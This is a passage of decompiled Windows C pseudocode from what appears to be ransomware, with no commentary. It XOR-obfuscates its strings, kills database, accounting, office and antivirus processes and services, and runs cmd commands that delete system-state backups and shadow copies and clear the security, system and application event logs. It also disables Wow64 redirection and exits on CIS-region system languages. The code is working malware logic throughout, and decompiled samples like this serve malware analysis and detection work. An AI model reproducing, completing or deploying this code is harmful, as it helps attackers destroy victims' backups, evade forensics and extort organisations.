  }
  v167[9] = 23;
  strcpy(&v167[10], "sqlmangr");
  strcpy(v159, "6supervise");
  strcpy(v175, "DRAgui");
  HIBYTE(v180) = 0;
  v137[8] = 18;
  strcpy(&v150[9], "jDefwatch");
  strcpy(v138, "Culture");
  v136[18] = 30;
  strcpy(v137, "winword");
  strcpy(v136, "GQBDBMgr");
  strcpy(v174, "|QBW32");
  v150[19] = 22;
  strcpy(v151, "qbupdate");
  strcpy(v158, "$axlbridge");
  strcpy(v164, "Cfdlauncher");
  strcpy(v163, "dhttpd");
  strcpy(&v151[9], "_MsDtSrvr");
  strcpy(v169, "fjava");
  strcpy(v178, "4360se");
  strcpy(v157, "]360doctor");
  strcpy(&v156[10], "|wdswfsafe");
  v143[18] = 5;
  strcpy(v144, "fdhost");
  v146[10] = 1;
  strcpy(v147, "GDscan");
  strcpy(v183, "0jXEt_^WvQ^WiE");
  v38 = 48;
  v39 = 0;
  while ( 1 )
  {
    v183[v39 + 1] ^= v38;
    if ( (unsigned int)++v39 >= 0xD )
      break;
    v38 = v183[0];
  }
  strcpy(v156, "oQBDBMgrN");
  strcpy(&v154[10], "nmysqld");
  v183[14] = 0;
  v40 = 0;
  strcpy(v317, "/nZ[@KJ\\DkJ\\D[@_n__");
  do
    v317[++v40] ^= v317[0];
  while ( v40 < 0x12 );
  v317[19] = 0;
  v41 = 101;
  v181[0] = 302384229;
  v42 = 0;
  v181[1] = 386336512;
  v181[2] = 1446410;
  v182 = 23;
  while ( 1 )
  {
    *((_BYTE *)v181 + ++v42) ^= v41;
    if ( v42 >= 0xC )
      break;
    v41 = v181[0];
  }
  v43 = 0;
  HIBYTE(v182) = 0;
  v334 = xmmword_418FD0;
  do
    *((_BYTE *)&v334 + ++v43) ^= v334;
  while ( v43 < 0xE );
  v44 = 0;
  HIBYTE(v334) = 0;
  v233 = xmmword_419350;
  v234 = 520094739;
  v235 = 4885;
  v236 = 0;
  do
    *((_BYTE *)&v233 + ++v44) ^= v233;
  while ( v44 < 0x15 );
  v152[10] = 17;
  strcpy(&v152[11], "CoreSync");
  v45 = 0;
  v236 = 0;
  v326 = xmmword_419500;
  v327 = 93;
  do
    *((_BYTE *)&v326 + ++v45) ^= v326;
  while ( v45 < 0x10 );
  strcpy(&v168[14], "@node");
  HIBYTE(v327) = 0;
  v46 = 0;
  v333 = xmmword_419000;
  do
    *((_BYTE *)&v333 + ++v46) ^= v333;
  while ( v46 < 0xE );
  HIBYTE(v333) = 0;
  v47 = 79;
  strcpy(v173, "O<6!,b;.<$-.=");
  v48 = 0;
  while ( 1 )
  {
    v173[v48 + 1] ^= v47;
    if ( (unsigned int)++v48 >= 0xC )
      break;
    v47 = v173[0];
  }
  v173[13] = 0;
  v49 = 69;
  strcpy(v172, "E6<+&h2*7. 7");
  v50 = 0;
  while ( 1 )
  {
    v172[v50 + 1] ^= v49;
    if ( (unsigned int)++v50 >= 0xB )
      break;
    v49 = v172[0];
  }
  v51 = 0;
  v172[12] = 0;
  v248 = xmmword_419100;
  v249 = 421462551;
  v250 = 24;
  do
    *((_BYTE *)&v248 + ++v51) ^= v248;
  while ( v51 < 0x14 );
  v52 = 0;
  HIBYTE(v250) = 0;
  v331 = xmmword_419240;
  v332 = 0;
  do
    *((_BYTE *)&v331 + ++v52) ^= v331;
  while ( v52 < 0xF );
  strcpy(v165, "NBrCtrlCntr");
  strcpy(v162, "@BrCcUxSys");
  v332 = 0;
  v53 = 0;
  v216 = xmmword_4191E0;
  v217 = 354039317;
  v218 = 152968218;
  v219 = 0;
  do
    *((_BYTE *)&v216 + ++v53) ^= v216;
  while ( v53 < 0x17 );
  v54 = 0;
  v219 = 0;
  v230 = xmmword_419910;
  v231 = 1699708775;
  strcpy(v232, "ih");
  do
    *((_BYTE *)&v230 + ++v54) ^= v230;
  while ( v54 < 0x15 );
  strcpy(&v136[9], "Kfbguard");
  strcpy(v153, "Wfbserver");
  v153[10] = 22;
  strcpy(&v153[11], "ONENOTEM");
  v232[2] = 0;
  lpServiceName = v167;
  v260 = (char *)v179 + 1;
  v261 = &v135[10];
  v262 = &v175[1];
  v263 = &v159[1];
  v264 = v138;
  v265 = &v134[1];
  v266 = &v150[10];
  v267 = &v155[1];
  v268 = v137;
  v269 = &v174[1];
  v270 = &v136[1];
  v271 = v151;
  v272 = (int)&v243 + 1;
  v273 = &v158[1];
  v274 = &v168[1];
  v275 = &v163[1];
  v276 = &v164[1];
  v277 = &v151[10];
  v278 = &v134[10];
  v279 = &v169[1];
  v280 = &v178[1];
  v281 = &v157[1];
  v282 = &v156[11];
  v283 = v144;
  v284 = v147;
  v285 = &v183[1];
  v286 = &v156[1];
  v287 = v143;
  v288 = &v154[11];
  v289 = &v317[1];
  v290 = (int)v181 + 1;
  v291 = (char *)&v334 + 1;
  v292 = (int)&v233 + 1;
  v293 = &v152[11];
  v294 = (int)&v326 + 1;
  v295 = &v168[15];
  v296 = (int)&v333 + 1;
  v297 = &v173[1];
  v298 = &v172[1];
  v299 = (int)&v248 + 1;
  v300 = (int)&v331 + 1;
  v301 = &v165[1];
  v302 = &v162[1];
  v303 = (int)&v216 + 1;
  v304 = (int)&v230 + 1;
  v305 = &v136[10];
  v306 = &v153[1];
  v307 = &v153[11];
  v308 = 0;
  do
  {
    PathRemoveExtensionA(&v352[77]);
    v55 = 0;
    do
    {
      v56 = v55;
      v57 = lstrcmpiA(&v352[77], (&lpServiceName)[v55]);
      if ( !v57 )
      {
        *(_OWORD *)v208 = xmmword_419430;
        strcpy(v209, "!$r!Zqhe;!$me\\");
        do
          v208[++v57] ^= v208[0];
        while ( v57 < 0x1D );
        v209[14] = 0;
        sub_4100C0(&v208[1], &v352[77], *(_DWORD *)&v352[49]);
        sub_40F270(*(void **)&v352[49]);
      }
      ++v55;
    }
    while ( (&v260)[v56] );
  }
  while ( Process32Next(hSnapshota, (LPPROCESSENTRY32)&v352[41]) );
  CloseHandle(hSnapshota);
  v200 = 0;
  if ( sub_40F8C0() )
  {
    v58 = 0;
    *(_OWORD *)ProcName = xmmword_419460;
    v345 = xmmword_418F80;
    do
      ProcName[++v58] ^= ProcName[0];
    while ( v58 < 0x1E );
    strcpy(v154, "Akernel32");
    HIBYTE(v345) = 0;
    ModuleHandleA = GetModuleHandleA(&v154[1]);
    ProcAddress = GetProcAddress(ModuleHandleA, &ProcName[1]);
    if ( ProcAddress )
      ((void (__stdcall *)(int *))ProcAddress)(&v200);
  }
  pExecInfo.cbSize = 60;
  pExecInfo.lpVerb = &v176[1];
  pExecInfo.lpFile = &v135[1];
  pExecInfo.lpParameters = (char *)&v348 + 1;
  pExecInfo.fMask = 0;
  pExecInfo.hwnd = 0;
  memset(&pExecInfo.lpDirectory, 0, 12);
  ShellExecuteExA(&pExecInfo);
  Sleep(0x3E8u);
  v61 = 0;
  v335[0] = xmmword_419810;
  v336 = 2119836715;
  v335[1] = xmmword_419800;
  v337 = 8351330;
  do
    *((_BYTE *)v335 + ++v61) ^= LOBYTE(v335[0]);
  while ( v61 < 0x26 );
  v62 = 0;
  v321[0] = xmmword_4190C0;
  HIBYTE(v337) = 0;
  v321[1] = xmmword_419050;
  v322 = 453446683;
  v323 = 303832848;
  v324 = 811473435;
  v325 = 17;
  do
    *((_BYTE *)v321 + ++v62) ^= LOBYTE(v321[0]);
  while ( v62 < 0x2C );
  v63 = 0;
  v338[0] = xmmword_419690;
  HIBYTE(v325) = 0;
  v338[1] = xmmword_419780;
  strcpy(v339, "^IM@@JME@Y^I_");
  v338[2] = xmmword_419490;
  do
    *((_BYTE *)v338 + ++v63) ^= LOBYTE(v338[0]);
  while ( v63 < 0x3C );
  v339[13] = 0;
  v188 = xmmword_419960;
  v189 = 1611888231;
  qmemcpy(v190, "j`gv~`g", sizeof(v190));
  v191 = sub_401020(&v188, 65);
  v192 = sub_401020(&v188, 84);
  v193 = sub_401020(&v188, 69);
  v194 = sub_401020(&v188, 66);
  v195 = sub_401020(&v188, 65);
  v196 = sub_401020(&v188, 67);
  v197 = sub_401020(&v188, 75);
  v198 = sub_401020(&v188, 85);
  v64 = 0;
  v199 = (unsigned __int8)sub_401020(&v188, 80);
  hSnapshotb = 0;
  do
  {
    hSCManagerb = *sub_401010((char *)&v188 + 1, v64);
    v65 = sub_401010((char *)&v188 + 1, v64);
    *v65 = sub_401020(&v188, hSCManagerb);
    v64 = (unsigned int)hSnapshotb + 1;
    hSnapshotb = (HANDLE)v64;
  }
  while ( v64 < 0x23 );
  *sub_401010((char *)&v188 + 1, 35) = 0;
  v316 = sub_401000((char *)&v188 + 1);
  v130 = 115;
  v131[0] = sub_401020(&v130, 47);
  v131[1] = sub_401020(&v130, 99);
  v131[2] = sub_401020(&v130, 32);
  v131[3] = sub_401020(&v130, 119);
  v131[4] = sub_401020(&v130, 98);
  v131[5] = sub_401020(&v130, 97);
  v131[6] = sub_401020(&v130, 100);
  v131[7] = sub_401020(&v130, 109);
  v131[8] = sub_401020(&v130, 105);
  v131[9] = sub_401020(&v130, 110);
  v131[10] = sub_401020(&v130, 32);
  v131[11] = sub_401020(&v130, 68);
  v131[12] = sub_401020(&v130, 69);
  v131[13] = sub_401020(&v130, 76);
  v131[14] = sub_401020(&v130, 69);
  v131[15] = sub_401020(&v130, 84);
  v131[16] = sub_401020(&v130, 69);
  v131[17] = sub_401020(&v130, 32);
  v131[18] = sub_401020(&v130, 83);
  v131[19] = sub_401020(&v130, 89);
  v131[20] = sub_401020(&v130, 83);
  v131[21] = sub_401020(&v130, 84);
  v131[22] = sub_401020(&v130, 69);
  v131[23] = sub_401020(&v130, 77);
  v131[24] = sub_401020(&v130, 83);
  v131[25] = sub_401020(&v130, 84);
  v131[26] = sub_401020(&v130, 65);
  v131[27] = sub_401020(&v130, 84);
  v131[28] = sub_401020(&v130, 69);
  v131[29] = sub_401020(&v130, 66);
  v131[30] = sub_401020(&v130, 65);
  v131[31] = sub_401020(&v130, 67);
  v131[32] = sub_401020(&v130, 75);
  v131[33] = sub_401020(&v130, 85);
  v131[34] = sub_401020(&v130, 80);
  v131[35] = sub_401020(&v130, 32);
  v131[36] = sub_401020(&v130, 45);
  v131[37] = sub_401020(&v130, 100);
  v131[38] = sub_401020(&v130, 101);
  v131[39] = sub_401020(&v130, 108);
  v131[40] = sub_401020(&v130, 101);
  v131[41] = sub_401020(&v130, 116);
  v131[42] = sub_401020(&v130, 101);
  v131[43] = sub_401020(&v130, 79);
  v131[44] = sub_401020(&v130, 108);
  v131[45] = sub_401020(&v130, 100);
  v131[46] = sub_401020(&v130, 101);
  v131[47] = sub_401020(&v130, 115);
  v66 = 0;
  v132 = (unsigned __int8)sub_401020(&v130, 116);
  hSnapshotc = 0;
  do
  {
    hSCManagerc = *sub_401010(v131, v66);
    v67 = sub_401010(v131, v66);
    *v67 = sub_401020(&v130, hSCManagerc);
    v66 = (unsigned int)hSnapshotc + 1;
    hSnapshotc = (HANDLE)v66;
  }
  while ( v66 < 0x31 );
  *sub_401010(v131, 49) = 0;
  v315 = sub_401000(v131);
  v126 = 10;
  v127[0] = sub_401020(&v126, 47);
  v127[1] = sub_401020(&v126, 99);
  v127[2] = sub_401020(&v126, 32);
  v127[3] = sub_401020(&v126, 119);
  v127[4] = sub_401020(&v126, 109);
  v127[5] = sub_401020(&v126, 105);
  v127[6] = sub_401020(&v126, 99);
  v127[7] = sub_401020(&v126, 32);
  v127[8] = sub_401020(&v126, 83);
  v127[9] = sub_401020(&v126, 72);
  v127[10] = sub_401020(&v126, 65);
  v127[11] = sub_401020(&v126, 68);
  v127[12] = sub_401020(&v126, 79);
  v127[13] = sub_401020(&v126, 87);
  v127[14] = sub_401020(&v126, 67);
  v127[15] = sub_401020(&v126, 79);
  v127[16] = sub_401020(&v126, 80);
  v127[17] = sub_401020(&v126, 89);
  v127[18] = sub_401020(&v126, 32);
  v127[19] = sub_401020(&v126, 47);
  v127[20] = sub_401020(&v126, 110);
  v127[21] = sub_401020(&v126, 111);
  v127[22] = sub_401020(&v126, 105);
  v127[23] = sub_401020(&v126, 110);
  v127[24] = sub_401020(&v126, 116);
  v127[25] = sub_401020(&v126, 101);
  v127[26] = sub_401020(&v126, 114);
  v127[27] = sub_401020(&v126, 97);
  v127[28] = sub_401020(&v126, 99);
  v127[29] = sub_401020(&v126, 116);
  v127[30] = sub_401020(&v126, 105);
  v127[31] = sub_401020(&v126, 118);
  v68 = 0;
  v127[32] = sub_401020(&v126, 101);
  v127[33] = 0;
  hSnapshotd = 0;
  do
  {
    hSCManagerd = *sub_401010(v127, v68);
    v69 = sub_401010(v127, v68);
    *v69 = sub_401020(&v126, hSCManagerd);
    v68 = (unsigned int)hSnapshotd + 1;
    hSnapshotd = (HANDLE)v68;
  }
  while ( v68 < 0x21 );
  *sub_401010(v127, 33) = 0;
  v314 = sub_401000(v127);
  v120 = 77;
  v121[0] = sub_401020(&v120, 47);
  v121[1] = sub_401020(&v120, 99);
  v121[2] = sub_401020(&v120, 32);
  v121[3] = sub_401020(&v120, 119);
  v121[4] = sub_401020(&v120, 101);
  v121[5] = sub_401020(&v120, 118);
  v121[6] = sub_401020(&v120, 116);
  v121[7] = sub_401020(&v120, 117);
  v121[8] = sub_401020(&v120, 116);
  v121[9] = sub_401020(&v120, 105);
  v121[10] = sub_401020(&v120, 108);
  v121[11] = sub_401020(&v120, 32);
  v121[12] = sub_401020(&v120, 99);
  v121[13] = sub_401020(&v120, 108);
  v121[14] = sub_401020(&v120, 32);
  v121[15] = sub_401020(&v120, 115);
  v121[16] = sub_401020(&v120, 101);
  v121[17] = sub_401020(&v120, 99);
  v121[18] = sub_401020(&v120, 117);
  v121[19] = sub_401020(&v120, 114);
  v121[20] = sub_401020(&v120, 105);
  v121[21] = sub_401020(&v120, 116);
  v70 = 0;
  v121[22] = sub_401020(&v120, 121);
  v121[23] = 0;
  hSnapshote = 0;
  do
  {
    hSCManagere = *sub_401010(v121, v70);
    v71 = sub_401010(v121, v70);
    *v71 = sub_401020(&v120, hSCManagere);
    v70 = (unsigned int)hSnapshote + 1;
    hSnapshote = (HANDLE)v70;
  }
  while ( v70 < 0x17 );
  *sub_401010(v121, 23) = 0;
  v187 = sub_401000(v121);
  v118 = 95;
  v119[0] = sub_401020(&v118, 47);
  v119[1] = sub_401020(&v118, 99);
  v119[2] = sub_401020(&v118, 32);
  v119[3] = sub_401020(&v118, 119);
  v119[4] = sub_401020(&v118, 101);
  v119[5] = sub_401020(&v118, 118);
  v119[6] = sub_401020(&v118, 116);
  v119[7] = sub_401020(&v118, 117);
  v119[8] = sub_401020(&v118, 116);
  v119[9] = sub_401020(&v118, 105);
  v119[10] = sub_401020(&v118, 108);
  v119[11] = sub_401020(&v118, 32);
  v119[12] = sub_401020(&v118, 99);
  v119[13] = sub_401020(&v118, 108);
  v119[14] = sub_401020(&v118, 32);
  v119[15] = sub_401020(&v118, 115);
  v119[16] = sub_401020(&v118, 121);
  v119[17] = sub_401020(&v118, 115);
  v119[18] = sub_401020(&v118, 116);
  v119[19] = sub_401020(&v118, 101);
  v72 = 0;
  v119[20] = sub_401020(&v118, 109);
  v119[21] = 0;
  hSnapshotf = 0;
  do
  {
    hSCManagerf = *sub_401010(v119, v72);
    v73 = sub_401010(v119, v72);
    *v73 = sub_401020(&v118, hSCManagerf);
    v72 = (unsigned int)hSnapshotf + 1;
    hSnapshotf = (HANDLE)v72;
  }
  while ( v72 < 0x15 );
  *sub_401010(v119, 21) = 0;
  v133 = sub_401000(v119);
  v122 = 120;
  v123[0] = sub_401020(&v122, 47);
  v123[1] = sub_401020(&v122, 99);
  v123[2] = sub_401020(&v122, 32);
  v123[3] = sub_401020(&v122, 119);
  v123[4] = sub_401020(&v122, 101);
  v123[5] = sub_401020(&v122, 118);
  v123[6] = sub_401020(&v122, 116);
  v123[7] = sub_401020(&v122, 117);
  v123[8] = sub_401020(&v122, 116);
  v123[9] = sub_401020(&v122, 105);
  v123[10] = sub_401020(&v122, 108);
  v123[11] = sub_401020(&v122, 32);
  v123[12] = sub_401020(&v122, 99);
  v123[13] = sub_401020(&v122, 108);
  v123[14] = sub_401020(&v122, 32);
  v123[15] = sub_401020(&v122, 97);
  v123[16] = sub_401020(&v122, 112);
  v123[17] = sub_401020(&v122, 112);
  v123[18] = sub_401020(&v122, 108);
  v123[19] = sub_401020(&v122, 105);
  v123[20] = sub_401020(&v122, 99);
  v123[21] = sub_401020(&v122, 97);
  v123[22] = sub_401020(&v122, 116);
  v123[23] = sub_401020(&v122, 105);
  v123[24] = sub_401020(&v122, 111);
  v74 = 0;
  v123[25] = sub_401020(&v122, 110);
  v123[26] = 0;
  hSnapshotg = 0;
  do
  {
    hSCManagerg = *sub_401010(v123, v74);
    v75 = sub_401010(v123, v74);
    *v75 = sub_401020(&v122, hSCManagerg);
    v74 = (unsigned int)hSnapshotg + 1;
    hSnapshotg = (HANDLE)v74;
  }
  while ( v74 < 0x1A );
  *sub_401010(v123, 26) = 0;
  Src[0] = (char *)v335 + 1;
  Src[1] = (char *)v321 + 1;
  Src[2] = (char *)v338 + 1;
  Src[3] = v316;
  Src[4] = v315;
  Src[5] = v314;
  Src[6] = v187;
  Src[7] = v133;
  Src[8] = sub_401000(v123);
  v76 = 0;
  Src[9] = 0;
  v77 = 0;
  hSCManagera = 0;
  while ( 1 )
  {
    if ( !Src[v77] )
    {
      v77 = 0;
      hSCManagera = (SC_HANDLE)((char *)v76 + 1);
      if ( v76 == (SC_HANDLE)2 )
        break;
    }
    StartupInfo.cb = 68;
    memset(&StartupInfo.lpReserved, 0, 64);
    ProcessInformation_4 = 0i64;
    memset(CommandLine, 0, 0x104u);
    v78 = Src[v77];
    if ( v78 )
      v78 = (void *)sub_40A1F0(Src[v77]);
    memcpy(CommandLine, Src[v77], (size_t)v78 + 1);
    v79 = !CreateProcessA(&v135[1], CommandLine, 0, 0, 1, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation_4);
    v76 = hSCManagera;
    if ( !v79 )
    {
      WaitForSingleObject(ProcessInformation_4.hProcess, 0xFFFFFFFF);
      CloseHandle(ProcessInformation_4.hProcess);
      CloseHandle(ProcessInformation_4.hThread);
      Sleep(0x64u);
      v76 = hSCManagera;
      ++v77;
    }
  }
  v128 = 47;
  v129[0] = sub_401020(&v128, 86);
  v129[1] = sub_401020(&v128, 111);
  v129[2] = sub_401020(&v128, 108);
  v129[3] = sub_401020(&v128, 117);
  v129[4] = sub_401020(&v128, 109);
  v129[5] = sub_401020(&v128, 101);
  v129[6] = sub_401020(&v128, 32);
  v129[7] = sub_401020(&v128, 83);
  v129[8] = sub_401020(&v128, 104);
  v129[9] = sub_401020(&v128, 97);
  v129[10] = sub_401020(&v128, 100);
  v129[11] = sub_401020(&v128, 111);
  v129[12] = sub_401020(&v128, 119);
  v129[13] = sub_401020(&v128, 32);
  v129[14] = sub_401020(&v128, 67);
  v129[15] = sub_401020(&v128, 111);
  v129[16] = sub_401020(&v128, 112);
  v129[17] = sub_401020(&v128, 121);
  v129[18] = sub_401020(&v128, 32);
  v129[19] = sub_401020(&v128, 38);
  v129[20] = sub_401020(&v128, 32);
  v129[21] = sub_401020(&v128, 69);
  v129[22] = sub_401020(&v128, 118);
  v129[23] = sub_401020(&v128, 101);
  v129[24] = sub_401020(&v128, 110);
  v129[25] = sub_401020(&v128, 116);
  v129[26] = sub_401020(&v128, 32);
  v129[27] = sub_401020(&v128, 108);
  v129[28] = sub_401020(&v128, 111);
  v129[29] = sub_401020(&v128, 103);
  v129[30] = sub_401020(&v128, 32);
  v129[31] = sub_401020(&v128, 99);
  v129[32] = sub_401020(&v128, 108);
  v129[33] = sub_401020(&v128, 101);
  v129[34] = sub_401020(&v128, 97);
  v129[35] = sub_401020(&v128, 110);
  v80 = 0;
  v129[36] = 0;
  do
  {
    v81 = sub_401010(v129, v80);
    LOBYTE(v81) = *v81;
    v133 = v81;
    v82 = sub_401010(v129, v80++);
    *v82 = sub_401020(&v128, (char)v133);
  }
  while ( v80 < 0x24 );
  *sub_401010(v129, 36) = 0;
  v83 = (const CHAR *)sub_401000(v129);
  sub_4100C0(v83);
  if ( sub_40F8C0() )
  {
    v124 = 116;
    v125[0] = sub_401020(&v124, 87);
    v125[1] = sub_401020(&v124, 111);
    v125[2] = sub_401020(&v124, 119);
    v125[3] = sub_401020(&v124, 54);
    v125[4] = sub_401020(&v124, 52);
    v125[5] = sub_401020(&v124, 82);
    v125[6] = sub_401020(&v124, 101);
    v125[7] = sub_401020(&v124, 118);
    v125[8] = sub_401020(&v124, 101);
    v125[9] = sub_401020(&v124, 114);
    v125[10] = sub_401020(&v124, 116);
    v125[11] = sub_401020(&v124, 87);
    v125[12] = sub_401020(&v124, 111);
    v125[13] = sub_401020(&v124, 119);
    v125[14] = sub_401020(&v124, 54);
    v125[15] = sub_401020(&v124, 52);
    v125[16] = sub_401020(&v124, 70);
    v125[17] = sub_401020(&v124, 115);
    v125[18] = sub_401020(&v124, 82);
    v125[19] = sub_401020(&v124, 101);
    v125[20] = sub_401020(&v124, 100);
    v125[21] = sub_401020(&v124, 105);
    v125[22] = sub_401020(&v124, 114);
    v125[23] = sub_401020(&v124, 101);
    v125[24] = sub_401020(&v124, 99);
    v125[25] = sub_401020(&v124, 116);
    v125[26] = sub_401020(&v124, 105);
    v125[27] = sub_401020(&v124, 111);
    v125[28] = sub_401020(&v124, 110);
    v84 = 0;
    v125[29] = 0;
    do
    {
      v85 = sub_401010(v125, v84);
      LOBYTE(v85) = *v85;
      v133 = v85;
      v86 = sub_401010(v125, v84++);
      *v86 = sub_401020(&v124, (char)v133);
    }
    while ( v84 < 0x1D );
    *sub_401010(v125, 29) = 0;
    v187 = sub_401000(v125);
    v116 = 83;
    v117[0] = sub_401020(&v116, 107);
    v117[1] = sub_401020(&v116, 101);
    v117[2] = sub_401020(&v116, 114);
    v117[3] = sub_401020(&v116, 110);
    v117[4] = sub_401020(&v116, 101);
    v117[5] = sub_401020(&v116, 108);
    v117[6] = sub_401020(&v116, 51);
    v117[7] = sub_401020(&v116, 50);
    v87 = 0;
    v117[8] = 0;
    do
    {
      v88 = sub_401010(v117, v87);
      LOBYTE(v88) = *v88;
      v133 = v88;
      v89 = sub_401010(v117, v87++);
      *v89 = sub_401020(&v116, (char)v133);
    }
    while ( v87 < 8 );
    *sub_401010(v117, 8) = 0;
    v90 = (const CHAR *)sub_401000(v117);
    v99 = (const CHAR *)v187;
    v91 = GetModuleHandleA(v90);
    v92 = GetProcAddress(v91, v99);
    if ( v92 )
      ((void (__stdcall *)(int))v92)(v200);
  }
  return 0;
}
// 418F80: using guessed type __int128 xmmword_418F80;
// 418FD0: using guessed type __int128 xmmword_418FD0;
// 419000: using guessed type __int128 xmmword_419000;
// 419050: using guessed type __int128 xmmword_419050;
// 4190C0: using guessed type __int128 xmmword_4190C0;
// 419100: using guessed type __int128 xmmword_419100;
// 419110: using guessed type __int128 xmmword_419110;
// 4191B0: using guessed type __int128 xmmword_4191B0;
// 4191E0: using guessed type __int128 xmmword_4191E0;
// 4191F0: using guessed type __int128 xmmword_4191F0;
// 419220: using guessed type __int128 xmmword_419220;
// 419240: using guessed type __int128 xmmword_419240;
// 419310: using guessed type __int128 xmmword_419310;
// 419350: using guessed type __int128 xmmword_419350;
// 419360: using guessed type __int128 xmmword_419360;
// 4193E0: using guessed type __int128 xmmword_4193E0;
// 419410: using guessed type __int128 xmmword_419410;
// 419430: using guessed type __int128 xmmword_419430;
// 419450: using guessed type __int128 xmmword_419450;
// 419460: using guessed type __int128 xmmword_419460;
// 419490: using guessed type __int128 xmmword_419490;
// 419500: using guessed type __int128 xmmword_419500;
// 419660: using guessed type __int128 xmmword_419660;
// 419690: using guessed type __int128 xmmword_419690;
// 419780: using guessed type __int128 xmmword_419780;
// 4197C0: using guessed type __int128 xmmword_4197C0;
// 419800: using guessed type __int128 xmmword_419800;
// 419810: using guessed type __int128 xmmword_419810;
// 419840: using guessed type __int128 xmmword_419840;
// 419870: using guessed type __int128 xmmword_419870;
// 419880: using guessed type __int128 xmmword_419880;
// 4198B0: using guessed type __int128 xmmword_4198B0;
// 4198C0: using guessed type __int128 xmmword_4198C0;
// 419910: using guessed type __int128 xmmword_419910;
// 419920: using guessed type __int128 xmmword_419920;
// 419950: using guessed type __int128 xmmword_419950;
// 419960: using guessed type __int128 xmmword_419960;
// 419970: using guessed type __int128 xmmword_419970;
// 419980: using guessed type __int128 xmmword_419980;
// 4199A0: using guessed type __int128 xmmword_4199A0;
// 40A8B0: using guessed type char var_A8D[19];
// 40A8B0: using guessed type char var_6F6[23];

//----- (0040F270) --------------------------------------------------------
HANDLE __thiscall sub_40F270(void *this)
{
  HANDLE Toolhelp32Snapshot; // ebx
  HANDLE result; // eax
  void *v4; // esi
  PROCESSENTRY32 pe; // [esp+10h] [ebp-128h] BYREF

  memset(&pe.cntUsage, 0, 0x124u);
  pe.dwSize = 296;
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  if ( Process32First(Toolhelp32Snapshot, &pe) )
  {
    do
    {
      if ( (void *)pe.th32ParentProcessID == this )
        sub_40F270(pe.th32ProcessID);
    }
    while ( Process32Next(Toolhelp32Snapshot, &pe) );
  }
  result = OpenProcess(1u, 0, (DWORD)this);
  v4 = result;
  if ( result )
  {
    TerminateProcess(result, 1u);
    return (HANDLE)CloseHandle(v4);
  }
  return result;
}

//----- (0040F310) --------------------------------------------------------
int __fastcall sub_40F310(SC_HANDLE hService, SC_HANDLE a2)
{
  struct _ENUM_SERVICE_STATUSA *v3; // eax
  LPENUM_SERVICE_STATUSA v4; // eax
  LPCSTR v5; // edi
  __m128i v6; // xmm1
  __int128 v7; // xmm0
  SC_HANDLE v8; // esi
  unsigned int v9; // eax
  struct _SERVICE_STATUS ServiceStatus; // [esp+Ch] [ebp-64h] BYREF
  CHAR v12[16]; // [esp+40h] [ebp-30h] BYREF
  DWORD dwWaitHint; // [esp+50h] [ebp-20h]
  SC_HANDLE hSCManager; // [esp+54h] [ebp-1Ch]
  char arglist[4]; // [esp+58h] [ebp-18h]
  LPENUM_SERVICE_STATUSA v16; // [esp+5Ch] [ebp-14h]
  DWORD v17; // [esp+60h] [ebp-10h]
  LPENUM_SERVICE_STATUSA lpServices; // [esp+64h] [ebp-Ch]
  DWORD ServicesReturned; // [esp+68h] [ebp-8h] BYREF
  DWORD pcbBytesNeeded; // [esp+6Ch] [ebp-4h] BYREF

  hSCManager = a2;
  *(_DWORD *)arglist = GetTickCount();
  if ( EnumDependentServicesA(hService, 1u, 0, 0, &pcbBytesNeeded, &ServicesReturned) )
    return 1;
  if ( GetLastError() == 234 )
  {
    v3 = (struct _ENUM_SERVICE_STATUSA *)malloc(pcbBytesNeeded);
    lpServices = v3;
    if ( v3 )
    {
      memset(v3, 0, pcbBytesNeeded);
      if ( EnumDependentServicesA(hService, 1u, lpServices, pcbBytesNeeded, &pcbBytesNeeded, &ServicesReturned) )
      {
        v17 = 0;
        if ( ServicesReturned )
        {
          v4 = lpServices;
          v5 = *(LPCSTR *)arglist;
          v16 = lpServices;
          do
          {
            v6 = *(__m128i *)&v4->lpServiceName;
            v7 = *(_OWORD *)&v4->ServiceStatus.dwControlsAccepted;
            dwWaitHint = v4->ServiceStatus.dwWaitHint;
            *(_OWORD *)v12 = v7;
            *(_DWORD *)arglist = _mm_cvtsi128_si32(v6);
            v8 = OpenServiceA(hSCManager, *(LPCSTR *)arglist, 0x24u);
            if ( !v8 || !ControlService(v8, 1u, &ServiceStatus) )
              return 0;
            while ( ServiceStatus.dwCurrentState != 1 )
            {
              Sleep(ServiceStatus.dwWaitHint);
              if ( !QueryServiceStatusEx(v8, SC_STATUS_PROCESS_INFO, (LPBYTE)&ServiceStatus, 0x24u, &pcbBytesNeeded) )
                return 0;
              if ( ServiceStatus.dwCurrentState == 1 )
              {
                v9 = 0;
                *(_OWORD *)v12 = xmmword_4198E0;
                dwWaitHint = 6644849;
                do
                  v12[++v9] ^= v12[0];
                while ( v9 < 0x12 );
                HIBYTE(dwWaitHint) = 0;
                sub_4100C0(&v12[1], *(_DWORD *)arglist);
                break;
              }
              if ( GetTickCount() - (unsigned int)v5 > 0x7530 )
                return 0;
            }
            CloseServiceHandle(v8);
            v4 = v16 + 1;
            ++v17;
            ++v16;
          }
          while ( v17 < ServicesReturned );
        }
        free(lpServices);
        return 1;
      }
    }
  }
  return 0;
}
// 4198E0: using guessed type __int128 xmmword_4198E0;

//----- (0040F4C0) --------------------------------------------------------
int sub_40F4C0()
{
  int result; // eax

  result = GetUserDefaultLangID();
  if ( (_WORD)result == 2092
    || (_WORD)result == 1068
    || (_WORD)result == 1067
    || (_WORD)result == 1059
    || (_WORD)result == 1079
    || (_WORD)result == 1087
    || (_WORD)result == 1088
    || (_WORD)result == 2073
    || (_WORD)result == 1049
    || (_WORD)result == 1064
    || (_WORD)result == 1090
    || (_WORD)result == 2115
    || (_WORD)result == 1091
    || (_WORD)result == 1058 )
  {
    ExitProcess(0);
  }
  return result;
}

//----- (0040F570) --------------------------------------------------------
int __thiscall sub_40F570(void *this)
{
  unsigned int i; // ecx
  BOOL v3; // ebx
  unsigned int v4; // ecx
  int v6; // esi
  int v7; // eax
  WCHAR Data[260]; // [esp+0h] [ebp-694h] BYREF
  WCHAR Filename[260]; // [esp+208h] [ebp-48Ch] BYREF
  WCHAR String2[260]; // [esp+410h] [ebp-284h] BYREF
  DWORD dwDisposition; // [esp+618h] [ebp-7Ch] BYREF
  CHAR SubKey[47]; // [esp+61Dh] [ebp-77h] BYREF
  DWORD Type; // [esp+64Ch] [ebp-48h] BYREF
  DWORD cbData; // [esp+650h] [ebp-44h] BYREF
  CHAR v15[16]; // [esp+657h] [ebp-3Dh] BYREF
